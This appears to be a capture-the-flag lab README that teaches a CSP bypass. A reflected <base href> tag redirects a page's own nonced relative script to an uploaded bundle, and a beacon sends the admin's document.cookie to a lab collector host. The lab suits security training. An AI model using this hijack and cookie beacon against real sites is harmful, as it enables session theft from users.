# CSP Bypass via Missing base-uri Directive

> Track: `xss` · Difficulty: **expert** · ~45 min · Free hints.

## Scenario

**Relaydash** is a dashboard. Its Content-Security-Policy locks scripts down to a
per-response **nonce**:

```
Content-Security-Policy: default-src 'self'; script-src 'nonce-<random>';
  img-src * data:; connect-src *; style-src 'self' 'unsafe-inline'; object-src 'none'
```

No `'unsafe-inline'` and — importantly — **no `'self'`** in `script-src`. So every
script you might inject is blocked, because none of them carry the per-response
nonce: an inline `<script>`, an `<img onerror>`, and even a
`<script src="/u/<id>/main.js">` pointing at same-origin content are all refused.
The page reflects a `?ref=` value into `<head>` **unescaped** (a single-tag HTML
injection), but with that CSP a reflected script simply does not run.

Two details matter. The dashboard loads its bundle with a **relative, nonced**
path:

```html
<head>
  <title>Relaydash</title>
  <!-- your ?ref= injection lands here -->
  <script src="main.js" nonce="<random>"></script>
</head>
```

and the CSP has **no `base-uri` directive**.

The admin bot logs in (`/internal/bot-login`) and visits any path you queue via
`POST /report`, carrying its **non-HttpOnly** `session` cookie.

## Objective

You cannot introduce your own script — the nonce sees to that. But `base-uri`
controls how the page's **own** relative script resolves, and it is missing. The
nonce lives on the `<script>` **element**, not on the URL, so if you can change
where `main.js` points, that trusted script will load from your location **with a
valid nonce**.

The app hosts same-origin content you control: upload a script and it is served at
`/u/<id>/main.js`.

```
POST /upload   {"js":"<your bundle>"}   →   {"id":"<id>", "path":"/u/<id>/main.js"}
```

So: upload your bundle, then inject `<base href="/u/<id>/">`. The dashboard's own
nonced `main.js` now resolves to **your** upload — running in Relaydash's origin,
with the admin cookie in scope. Beacon it to the collector:

```
http://collector:9000/report?c=<document.cookie>
```

Read it back via `GET /oob/received`, then:

```
POST /solve   {"c":"<32 hex>"}
```

`/solve` returns `FLAG{<64 hex>}` when it matches the admin session.

## Getting Started

1. Confirm what the CSP blocks: inject `<script>…</script>`, `<img onerror=…>`, and
   even a `<script src="/u/<id>/main.js">` (after uploading a bundle) through
   `?ref=` — none run. Read the CSP header. What authorises a script here, and what
   is **missing** from the policy?
2. The bundle is loaded by a **relative** URL that already carries a valid nonce.
   What decides where a relative URL points — and which CSP directive was supposed
   to lock that down but isn't there?
3. You cannot add a nonce to your own tag, but you can move where the page's
   existing nonced tag resolves. One HTML tag in `<head>` does that.

**CWE-79 / CWE-829 (Inclusion of Functionality from an Untrusted Control Sphere).
OWASP A03:2021 – Injection.** The fix — set `base-uri 'none'` (or `'self'`)
alongside every `script-src` — is in `SOLUTION.md`.

## Note on the stack

The catalogued scenario is a Ruby/Sinatra target with a second attacker origin.
This lab keeps a **Flask** target and makes the base-uri hijack **self-contained
and same-origin**: the redirected script is an ordinary uploaded file served under
`/u/<id>/main.js`. The **nonce** `script-src` (no `'self'`) is what makes the
base-uri technique _necessary_ — a direct `<script src>` to that upload is blocked,
so only redirecting the page's own nonced script works. See `SOLUTION.md` for the
design note and the deviation from the catalog stack.
